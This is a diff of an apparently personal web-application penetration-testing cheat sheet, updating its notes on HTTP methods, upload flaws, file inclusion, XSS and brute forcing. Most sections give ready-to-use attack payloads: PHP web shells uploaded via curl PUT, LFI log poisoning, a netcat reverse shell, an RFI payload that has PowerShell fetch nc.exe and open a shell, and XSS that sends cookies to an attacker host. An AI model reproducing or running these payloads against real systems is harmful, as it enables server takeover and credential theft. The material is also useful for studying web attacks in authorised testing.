@@ -1,4 +1,4 @@
-Web Apps
+fWeb Apps
 
 
 # HTTP Methods or Verbs
@@ -19,7 +19,7 @@ TRACE     Used for debugging.
 200       OK
 301       Moved Permanently
 302       Found
-304       Not Modified 
+304       Not Modified
 400       Bad Request
 401       Unauthorized
 403       Forbidden
@@ -29,7 +29,7 @@ TRACE     Used for debugging.
 
 # Browser Redirection
 
-<iframe SRC="http://attacker IP/report" height = "0" width ="0">
+<iframe SRC="http://<attacker IP>/report" height = "0" width ="0">
 hacker:  use Metasploit browser autopwn
 ------------------------------------------------------------------------------------------------------
 
@@ -57,17 +57,13 @@ http://target IP/test.php?cmd=nc -e /bin/sh <attacker IP> 443
 
 HttpOnly - prevents JavaScript from accessing the cookie
 Secure - only send over an encrypted channel
-
-Firefox > Cookies > View Cookie Information
-HttpOnly cookie tells the browser if a Java scripts tries to access the cookie, the browser should not 
-  return a value.
 ------------------------------------------------------------------------------------------------------
 
 # Cookie Stealing
 
 <script>alert(document.cookie)</script>
 
-<script>new Image().src="http://attacker IP/test.php?"+ document.cookie;</script>
+<script>new Image().src="http://<attacker IP>/test.php?"+ document.cookie;</script>
 hacker: nc -lvp 80
 ------------------------------------------------------------------------------------------------------
 
@@ -82,18 +78,19 @@ Inspector - post DOM
 
 # File or PUT Upload Vuln
 
-Create a PHP file called evil.php 
+Create a PHP file called shell.php
+
 <?php
 $cmd=$_GET["cmd"];
 $decode=base64_decode($cmd);
 os.system($decode);
 ?>
 
-curl --upload-file evil.php -v --url http://target IP/evil.php
-curl -iksX PUT -d 'evil.php' <target IP>
+curl -ikL -T shell.php http://<target IP>/shell.php
+Once the file has been uploaded, pass base64 encoded commands to it to get basic code execution
 
-Once the malicious file is in place, pass base64 encoded commands to it, and get basic code execution 
-  on the web server, as the "apache" user.
+- Method 2
+curl -ikL -X PUT -d '<?php system($_GET["c"]);?>' http://<target IP>/shell.php
 
 wget -O output -o /dev/null www.target.com/evil.php?cmd=$(echo id|base64)
 wget -O output -o /dev/null www.target.com/evil.php?cmd=$(echo ifconfig|base64)
@@ -107,7 +104,7 @@ When you are inside of a POST parameter, always use URL encoding.
 
 # Headers, Apache version, eTag, HTTP Basic Authentication Enabled
 
-telnet <target IP> 80
+nc <target IP> 80
 HEAD / HTTP/1.0
 (hit enter 2x)
 
@@ -118,11 +115,11 @@ for i in `cat 80.txt` ; do curl -iksX HEAD http://$i/ > $i 2>&1 ; echo Scanned $
 
 # HTTP methods allowed
 
-telnet <target IP> 80
+nc <target IP> 80
 OPTIONS / HTTP/1.0
 (hit enter 2x)
 
-curl -iksX OPTIONS <target IP>
+curl -ikLsX OPTIONS <target IP>
 ------------------------------------------------------------------------------------------------------
 
 # iframe
@@ -132,15 +129,23 @@ curl -iksX OPTIONS <target IP>
 
 # Local file inclusion
 
-http://target IP/test.php?page=/etc/passwd
+http://<target IP>/test.php?page=/etc/passwd
+
+- method 2
+nc <target IP> 80
+GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1
+Host: <target IP>
+Connection: close
+
+Send as cmd payload via http://<target IP>/index.php?page=../../../../../var/log/apache2/access.log&cmd=id
 ------------------------------------------------------------------------------------------------------
 
 # PHP version
 
-telnet <target IP> 80
+nc <target IP> 80
 GET / HEAD/1.0
 
-http://target IP/aaaaa.php
+http://<target IP>/aaaaa.php
 
 Firefox > Web Developer Toolbar > Information > View Response Headers
 ------------------------------------------------------------------------------------------------------
@@ -153,7 +158,10 @@ Firefox > Web Developer Toolbar > Information > View Response Headers
 
 # Remote File Inclusion
 
-http://target IP/test.php?page=http://attacker IP/evil.txt
+http://<target IP>/test.php?page=http://<attacker IP>/evil.txt
+
+- method 2
+<?php system("powershell -Command \"& {(New-Object System.Net.WebClient).DownloadFile('http://<attacker IP>/netcat/nc.exe','nc.exe'); cmd /c nc.exe <attacker IP> 443 -e cmd.exe\" }"); ?>
 ------------------------------------------------------------------------------------------------------
 
 # URL Encoding
@@ -214,14 +222,14 @@ Try using an HTML entity:  &lt;script&gt:
 Stored - example: guestbook
 <script>alert("XSS")</script>
 <script>alert(document.cookie)</script>
-<iframe SRC="http://attacker IP" height="0" width="0"></iframe>
-<img src="http://attacker IP/doom.png" onload="javascript:alert('red team')"/>
+<iframe SRC="http://<attacker IP>" height="0" width="0"></iframe>
+<img src="http://<attacker IP>/doom.png" onload="javascript:alert('red team')"/>
 <script>new Image().src="http://attakerIP/test.php?output="+document.cookie;</script>
 
 curl http://target.com/login.php?user=`perl –e 'print "a" x 500'`
 
 # DOM Based XSS      <img src="x" onerror="alert(42)" />
-# BeEF               <script> src = "http://attacker IP:3000/hook.js"></script>
+# BeEF               <script> src = "http://<attacker IP>:3000/hook.js"></script>
 ------------------------------------------------------------------------------------------------------
 
 # Additional Guides
@@ -261,12 +269,14 @@ davtest -url https://target.com
 droopescan scan drupal -u https://target.com
 joomscan -u https://target.com
 uniscan -u https://www.target.com -qweds
-wpscan --url https://target.com --enumerate p --enumerate t --enumerate u
-------------------------------------------------------------------------------------------------------
+wpscan --url https://target.com --enumerate vp,vt,cb,u,m
 
-Manually craw the app with Firefox (Wapalyzer plugin)
+- Enumerate app
+Wappalyzer is a browser extension that uncovers the technologies used on websites. It detects CMS,
+   eCommerce platforms, web servers, JavaScript frameworks, analytics tools and more.
 
-Use Burp to spider the app
+- Burp
+Manually craw the app by using Firefox to click on every link on every page.
 
 Burp > Target > Site map > right click on root folder > Engagement tools > Discover content > Config > 
   Target: check Directories only, and disable Recurse subdirectories
@@ -304,10 +314,6 @@ Burp    Cluster bomb - multiple usernames/passwords using all combinations.
         Look for a Status of 3xx then sort by Length.
 
 Hydra   hydra -L users.txt -P pass.txt <target IP> http-get
-
-Medusa  medusa -U users.txt -P pass.txt -h <target IP> -M http -f
-
-Ncrack  ncrack -U users.txt -P pass.txt http://<target IP>
 
 Metasploit
 	use auxiliary/scanner/http/http_login
